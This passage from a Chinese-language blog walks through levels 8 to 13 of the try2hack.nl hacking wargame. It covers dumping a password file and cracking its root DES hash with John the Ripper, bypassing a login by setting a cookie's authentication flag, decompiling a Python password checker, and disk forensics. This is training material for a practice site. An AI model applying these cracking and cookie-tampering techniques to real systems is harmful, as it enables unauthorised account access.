class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:Charlie &amp;amp;:&lt;span class=&quot;regexp&quot;&gt;/root:/u&lt;/span&gt;sr/local/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;daemon:*:&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;::&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:Owner &lt;span class=&quot;keyword&quot;&gt;of&lt;/span&gt; many system processes:&lt;span class=&quot;regexp&quot;&gt;/root:/&lt;/span&gt;sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;operator:*:&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;::&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:System Operator:&lt;span class=&quot;regexp&quot;&gt;/:/&lt;/span&gt;sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bin:*:&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;::&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:Binaries Commands and Source:&lt;span class=&quot;regexp&quot;&gt;/:/&lt;/span&gt;sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tty:*:&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;65533&lt;/span&gt;::&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:Tty Sandbox:&lt;span class=&quot;regexp&quot;&gt;/:/&lt;/span&gt;sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;kmem:*:&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;65533&lt;/span&gt;::&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:KMem Sandbox:&lt;span class=&quot;regexp&quot;&gt;/:/&lt;/span&gt;sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;games:*:&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;::&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:Games pseudo-user:&lt;span class=&quot;regexp&quot;&gt;/usr/g&lt;/span&gt;ames:&lt;span class=&quot;regexp&quot;&gt;/sbin/&lt;/span&gt;nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;news:*:&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;::&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:News Subsystem:&lt;span class=&quot;regexp&quot;&gt;/:/&lt;/span&gt;sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;man:*:&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;::&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:Mister Man Pages:&lt;span class=&quot;regexp&quot;&gt;/usr/&lt;/span&gt;share/man:&lt;span class=&quot;regexp&quot;&gt;/sbin/&lt;/span&gt;nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sshd:*:&lt;span class=&quot;number&quot;&gt;22&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;22&lt;/span&gt;::&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:Secure Shell Daemon:&lt;span class=&quot;regexp&quot;&gt;/var/&lt;/span&gt;empty:&lt;span class=&quot;regexp&quot;&gt;/sbin/&lt;/span&gt;nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;smmsp:*:&lt;span class=&quot;number&quot;&gt;25&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;25&lt;/span&gt;::&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:Sendmail Submission User:&lt;span class=&quot;regexp&quot;&gt;/var/&lt;/span&gt;spool/clientmqueue:&lt;span class=&quot;regexp&quot;&gt;/sbin/&lt;/span&gt;nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mailnull:*:&lt;span class=&quot;number&quot;&gt;26&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;26&lt;/span&gt;::&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:Sendmail Default User:&lt;span class=&quot;regexp&quot;&gt;/var/&lt;/span&gt;spool/mqueue:&lt;span class=&quot;regexp&quot;&gt;/sbin/&lt;/span&gt;nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bind:*:&lt;span class=&quot;number&quot;&gt;53&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;53&lt;/span&gt;::&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:Bind Sandbox:&lt;span class=&quot;regexp&quot;&gt;/:/&lt;/span&gt;sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;uucp:*:&lt;span class=&quot;number&quot;&gt;66&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;66&lt;/span&gt;::&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:UUCP pseudo-user:&lt;span class=&quot;regexp&quot;&gt;/var/&lt;/span&gt;spool/uucppublic:&lt;span class=&quot;regexp&quot;&gt;/usr/&lt;/span&gt;libexec/uucp/uucico xten:*:&lt;span class=&quot;number&quot;&gt;67&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;67&lt;/span&gt;::&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:X&lt;span class=&quot;number&quot;&gt;-10&lt;/span&gt; daemon:&lt;span class=&quot;regexp&quot;&gt;/usr/&lt;/span&gt;local/xten:&lt;span class=&quot;regexp&quot;&gt;/sbin/&lt;/span&gt;nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pop:*:&lt;span class=&quot;number&quot;&gt;68&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;::&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:Post Office Owner:&lt;span class=&quot;regexp&quot;&gt;/nonexistent:/&lt;/span&gt;sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;www:*:&lt;span class=&quot;number&quot;&gt;80&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;80&lt;/span&gt;::&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:World Wide Web Owner:&lt;span class=&quot;regexp&quot;&gt;/nonexistent:/&lt;/span&gt;sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;nobody:*:&lt;span class=&quot;number&quot;&gt;65534&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;65534&lt;/span&gt;::&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:Unprivileged user:&lt;span class=&quot;regexp&quot;&gt;/nonexistent:/&lt;/span&gt;sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果搞过密码档的话，这些东西就是经过系统加密的网站注册用户资料文档，其中冒号前面是用户名，用户名是不加密的，冒号后面就是该用户的密码，不过已经被系统加密。绝大部分Unix系统都使用DES加密方式，经过处理的密码应该是13位。注意看第一条记录，这样就只需解密用户root对应的密码“khXGN7s.ldaJI”就行了。&lt;br&gt;用什么解密呢？网上大部分的在线DES加密解密网站都是需要我们自己输入密钥的，因此这些网站对我们破解该密码一点卵用都没有，知道密钥了我还要你破解个毛线啊！后来我找了半天，终于找到了这个软件：&lt;a href=&quot;http://www.openwall.com/john/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;John the Ripper password cracker&lt;/a&gt;，具体用法请&lt;a href=&quot;http://blog.sina.com.cn/s/blog_8cb5c0e501015w0k.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;参考此文&lt;/a&gt;。&lt;br&gt;最后我用的是穷举模式进行的破解，得到结果如下：&lt;br&gt;&lt;img src=&quot;/images/try2hack/22.png&quot; alt=&quot;22&quot;&gt;&lt;br&gt;可以看到用户名是：root，密码是：arse，顺利通过。&lt;br&gt;&lt;strong&gt;总结：该关主要考查对pfh漏洞的利用以及EDS密码的破解。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;Level-9&quot;&gt;&lt;a href=&quot;#Level-9&quot; class=&quot;headerlink&quot; title=&quot;Level 9&quot;&gt;&lt;/a&gt;Level 9&lt;/h3&gt;&lt;p&gt;网址：&lt;a href=&quot;http://try2hack.nl/levels/level9-gnapei.xhtml&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://try2hack.nl/levels/level9-gnapei.xhtml&lt;/a&gt;&lt;br&gt;这是第九关：&lt;br&gt;&lt;img src=&quot;/images/try2hack/23.png&quot; alt=&quot;23&quot;&gt;&lt;br&gt;同样是输入用户名和密码。&lt;br&gt;用burpsuit拦截后分析，观察到其请求头如下：&lt;br&gt;&lt;img src=&quot;/images/try2hack/24.png&quot; alt=&quot;24&quot;&gt;&lt;br&gt;观察cookie，会发现其很有特色，分别是用户名、密码和是否被验证的标志位。&lt;br&gt;按照会话管理的常理来说，一般会话的cookie检验通过了的话，是不需要检验浏览器提交的用户名和密码了的，于是我第一次是在cookie中将请求是否验证标志位由no改为了yes，提交之后，显示失败。可知服务器还是需要用户名和密码的，这里的用户名和密码输入可以和cookie一样，并且把验证标志位改为yes，再次尝试：&lt;br&gt;&lt;img src=&quot;/images/try2hack/25.png&quot; alt=&quot;25&quot;&gt;&lt;br&gt;提交之后就顺利通过了。&lt;br&gt;&lt;strong&gt;总结：这关考查我们的cookie绕过。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;Level-10&quot;&gt;&lt;a href=&quot;#Level-10&quot; class=&quot;headerlink&quot; title=&quot;Level 10&quot;&gt;&lt;/a&gt;Level 10&lt;/h3&gt;&lt;p&gt;这一关开始页面如下：&lt;br&gt;&lt;img src=&quot;/images/try2hack/26.png&quot; alt=&quot;26&quot;&gt;&lt;br&gt;要求我们下载一个IRC的客户端软件，然后登陆irc.mediamonks.net服务器的#try2hack.level10房间。&lt;br&gt;这里我搞了很久，登陆进去之后如下图所示：&lt;br&gt;&lt;img src=&quot;/images/try2hack/27.png&quot; alt=&quot;27&quot;&gt;&lt;br&gt;这么多0和1构成的字符串，是二进制的，首先想到的二进制解密，但非常蛋疼的是，这个IRC聊天软件居然不能复制，只能先保存成图片，然后进行文字识别。找了半天，终于找到&lt;a href=&quot;http://www.onlineocr.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这个网站&lt;/a&gt;提供在线的文字识别，然后又到&lt;a href=&quot;http://www.nickciske.com/tools/binary.php&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这个网站&lt;/a&gt;进行二进制文件的解密。解密出来的字符串为：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Nice job. Now type ‘/msg TRY2HACK showbug’ to see the bug&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;输入之后，给出的回复如下：&lt;br&gt;&lt;img src=&quot;/images/try2hack/28.png&quot; alt=&quot;28&quot;&gt;&lt;/p&gt;
&lt;p&gt;这看起来像一段脚本，感觉又被加密了的，这是用&lt;a href=&quot;http://baike.baidu.com/link?url=23yqs5jB0i4dwPhnIBYzF-Ud3_vNCizdFZ0-Qet11fK0zfP28Xc_A2g0rkhtyI4w9kXTuw0bBz0bVVZAMuqXWK&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ROT13&lt;/a&gt;进行加密的，ROT13加密常被应用于聊天中或网路论坛用作隐藏八卦、妙句、脏话等。&lt;br&gt;在&lt;a href=&quot;http://rot13.de/index.php&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这个网站&lt;/a&gt;中将这段文字在线解密得到如下结果：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bind ctcr - PING ctcr:pingreply&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;proc ctcr:pingreply &amp;#123;nick uhost hand dest key arg&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; dur [expr [unixtime] - $arg]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	putserv &lt;span class=&quot;string&quot;&gt;&quot;NOTICE $nick :Your ping reply took $dur seconds&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这应该是一个活动主机检测的脚本。然后后面我也不知道该怎么做了，国外有人给出了&lt;a href=&quot;https://github.com/dsolstad/walkthrough-try2hack.nl/blob/master/level10.md&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;解决方案&lt;/a&gt;，但我没有看懂。如果有人弄懂了，欢迎&lt;a href=&quot;http://qimingyu.github.io/resumeofChinese/&quot;&gt;联系我&lt;/a&gt;。&lt;/p&gt;
&lt;h3 id=&quot;Level-11&quot;&gt;&lt;a href=&quot;#Level-11&quot; class=&quot;headerlink&quot; title=&quot;Level 11&quot;&gt;&lt;/a&gt;Level 11&lt;/h3&gt;&lt;p&gt;网址：&lt;a href=&quot;http://www.try2hack.nl/levels/level11-vmituh.xhtml&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.try2hack.nl/levels/level11-vmituh.xhtml&lt;/a&gt;&lt;br&gt;第十一关开始的页面如下：&lt;br&gt;&lt;img src=&quot;/images/try2hack/29.png&quot; alt=&quot;29&quot;&gt;&lt;br&gt;上面的字符串和数字均是随机生成的&lt;br&gt;它的要求就是在5秒内输入指定位数的字母对应的ASCII码的十进制值的乘积的前5位数字。&lt;br&gt;首先想到的是修改response，然后修改页面属性。使其把时间延长至无限，再手工算出来，填进去，这是一个解决方案。另一个解决方案是写一段脚本，自动计算后填进去。具体代码后面再给出。&lt;br&gt;&lt;strong&gt;总结：这部分考查我们写一段小脚本的能力。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;Level-12&quot;&gt;&lt;a href=&quot;#Level-12&quot; class=&quot;headerlink&quot; title=&quot;Level 12&quot;&gt;&lt;/a&gt;Level 12&lt;/h3&gt;&lt;p&gt;网址：&lt;a href=&quot;http://www.try2hack.nl/levels/level12-kvdsju.xhtml&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.try2hack.nl/levels/level12-kvdsju.xhtml&lt;/a&gt;&lt;br&gt;显示页面为：&lt;br&gt;&lt;img src=&quot;/images/try2hack/30.png&quot; alt=&quot;30&quot;&gt;&lt;br&gt;下载之后发现是一个以.pyc为后缀名的文件。pyc是python的字节码文件，因此需要反编译查看源码，在&lt;a href=&quot;http://tool.lu/pyc/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这个网站&lt;/a&gt;可以进行python的在线反编译。&lt;br&gt;反编译后得到如下代码：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; md5 &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; new&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;Enter username:&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;username = raw_input()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;Enter password:&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;password = raw_input()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    x = chr(int(password[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]) / &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; - &lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    x += chr((int(password[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]) / &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;) * &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    x += chr((int(password[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]) - &lt;span class=&quot;number&quot;&gt;700&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;173&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    x += chr((int(password[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]) - &lt;span class=&quot;number&quot;&gt;148&lt;/span&gt;) / &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; - &lt;span class=&quot;number&quot;&gt;21&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    x += chr((int(password[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]) - &lt;span class=&quot;number&quot;&gt;327&lt;/span&gt;) / &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; - &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    x += chr(int(password[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]) - &lt;span class=&quot;number&quot;&gt;534&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    x += chr(((int(password[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]) + &lt;span class=&quot;number&quot;&gt;52&lt;/span&gt;) / &lt;span class=&quot;number&quot;&gt;70&lt;/span&gt;) * &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    x += chr(int(password[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]) ** &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; - &lt;span class=&quot;number&quot;&gt;640&lt;/span&gt; * int(password[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]) - &lt;span class=&quot;number&quot;&gt;5083&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    x += chr(int(password[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]) * &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt; - &lt;span class=&quot;number&quot;&gt;3126&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;except&lt;/span&gt; ValueError:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;pass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; new(username).hexdigest() == &lt;span class=&quot;string&quot;&gt;&#39;3e3a378c63aa1&#39;&lt;/span&gt; + x[&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;] + &lt;span class=&quot;string&quot;&gt;&#39;55e3e9&#39;&lt;/span&gt; + x[&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;] + &lt;span class=&quot;string&quot;&gt;&#39;e9d2bdcd6a1&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;and&lt;/span&gt; password[&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;] == x:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;Well done. Enter the valid username and password on the form online.&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;Wrong username and/or password&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;except&lt;/span&gt; NameError:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;Wrong username and/or password&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于Python版本不一样，以上代码稍加修改后就能正常运行了。&lt;br&gt;MD5是消息摘要算法，提供消息的完整性保护。这段代码的意思是密码自生成并且自检验，只要符合算法规则的用户名和密码都是合理的。&lt;br&gt;&lt;strong&gt;总结：这部分考查Python反编译和算法。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;Level-13&quot;&gt;&lt;a href=&quot;#Level-13&quot; class=&quot;headerlink&quot; title=&quot;Level 13&quot;&gt;&lt;/a&gt;Level 13&lt;/h3&gt;&lt;p&gt;网址：&lt;a href=&quot;http://www.try2hack.nl/levels/level13-olwehfdow.xhtml&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.try2hack.nl/levels/level13-olwehfdow.xhtml&lt;/a&gt;&lt;br&gt;终于来到最后一关了，显示页面如下：&lt;br&gt;&lt;img src=&quot;/images/try2hack/31.png&quot; alt=&quot;31&quot;&gt;&lt;br&gt;显示需要下载文件，这个文件比较大，有60多兆。&lt;br&gt;Sleuth Kit是一个用来分析磁盘映像和恢复文件的开源取证工具。&lt;br&gt;这是Linux的一个文件系统，我们需要挂载该文件系统。&lt;br&gt;最后得到密码为：f1ff950850ac2f1f51fa82d839f0bd1b&lt;br&gt;然后出现如下页面：&lt;br&gt;&lt;img src=&quot;/images/try2hack/32.png&quot; alt=&quot;32&quot;&gt;&lt;br&gt;已经全部通关了。&lt;br&gt;&lt;strong&gt;总结：这部分考查对Linux系统的了解。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;Web攻击学无止境，关键在于把基本知识掌握之后，要熟悉很多常见的漏洞及利用方式，然后再加以创造性的综合利用，渗透工程师是一门非常需要积累和经验的工作。而做一名安全构架师，则更是任重而道远。这是需要花时间和精力去认真修炼打磨的。积累自己的势能。&lt;br&gt;这个try2hack网站太老了，很多技术都已经过时，不过用来训练思维还是不错的。&lt;br&gt;任何语言都是可以反编译的。还需要提高自己逆向的能力以及加强对底层的了解。&lt;br&gt;基础还不够，必须要精通一门语言才行，例如第十一关，写一段小代码都要写半天。&lt;br&gt;最后，Level10-13还有待修改完善，以及原理还有待弄懂。未完，待续。  &lt;/p&gt;
&lt;hr&gt;
